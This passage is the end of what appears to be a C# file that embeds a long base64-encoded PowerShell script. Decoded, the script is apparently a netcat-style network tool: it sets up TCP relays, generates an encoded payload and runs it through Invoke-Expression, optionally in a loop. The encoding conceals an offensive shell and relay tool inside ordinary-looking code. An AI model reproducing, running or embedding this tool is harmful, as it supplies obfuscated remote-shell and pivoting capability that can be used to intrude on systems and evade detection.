AgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQ0KICAgIH0NCiAgICBlbHNlaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ0Y3AiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVENQIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQ0KICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7JEludm9rZVN0cmluZyArPSAoIkAoJycsYCRUcnVlLCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCckdCcpICIpfQ0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDMpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLGAkRmFsc2UsJyIgKyAkci5zcGxpdCgiOiIpWzJdICsgIicsJyR0JykgIil9DQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQ0KICAgIH0NCiAgfQ0KICBlbHNlDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IENvbnNvbGUiDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ29uc29sZX0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfQ29uc29sZX0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9Db25zb2xlfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9Db25zb2xlfSArICJgbn1gbmBuIikNCiAgICAkSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRvICsgIicpIikNCiAgfQ0KICANCiAgaWYoJGVwKXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWluX1Bvd2Vyc2hlbGx9ICsgImBufWBuYG4iKX0NCiAgZWxzZXskRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBNYWluYG57YG4iICsgJHtmdW5jdGlvbjpNYWlufSArICJgbn1gbmBuIil9DQogICRJbnZva2VTdHJpbmcgPSAoJEZ1bmN0aW9uU3RyaW5nICsgJEludm9rZVN0cmluZykNCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgUkVUVVJOIEdFTkVSQVRFRCBQQVlMT0FEUyAjIyMjIyMjIyMjDQogIGlmKCRnZSl7V3JpdGUtVmVyYm9zZSAiUmV0dXJuaW5nIEVuY29kZWQgUGF5bG9hZC4uLiIgOyByZXR1cm4gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKCRJbnZva2VTdHJpbmcpKX0NCiAgZWxzZWlmKCRnKXtXcml0ZS1WZXJib3NlICJSZXR1cm5pbmcgUGF5bG9hZC4uLiIgOyByZXR1cm4gJEludm9rZVN0cmluZ30NCiAgIyMjIyMjIyMjIyBSRVRVUk4gR0VORVJBVEVEIFBBWUxPQURTICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgRVhFQ1VUSU9OICMjIyMjIyMjIyMNCiAgJE91dHB1dCA9ICRudWxsDQogIHRyeQ0KICB7DQogICAgaWYoJHJlcCkNCiAgICB7DQogICAgICB3aGlsZSgkVHJ1ZSkNCiAgICAgIHsNCiAgICAgICAgJE91dHB1dCArPSBJRVggJEludm9rZVN0cmluZw0KICAgICAgICBTdGFydC1TbGVlcCAtcyAyDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlJlcGV0aXRpb24gRW5hYmxlZDogUmVzdGFydGluZy4uLiINCiAgICAgIH0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICRPdXRwdXQgKz0gSUVYICRJbnZva2VTdHJpbmcNCiAgICB9DQogIH0NCiAgZmluYWxseQ0KICB7DQogICAgaWYoJE91dHB1dCAtbmUgJG51bGwpDQogICAgew0KICAgICAgaWYoJG9mIC1lcSAiIil7JE91dHB1dH0NCiAgICAgIGVsc2V7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRvZiwkT3V0cHV0KX0NCiAgICB9DQogIH0NCiAgIyMjIyMjIyMjIyBFWEVDVVRJT04gIyMjIyMjIyMjIw0KfQ0K"));
        }
    }
}
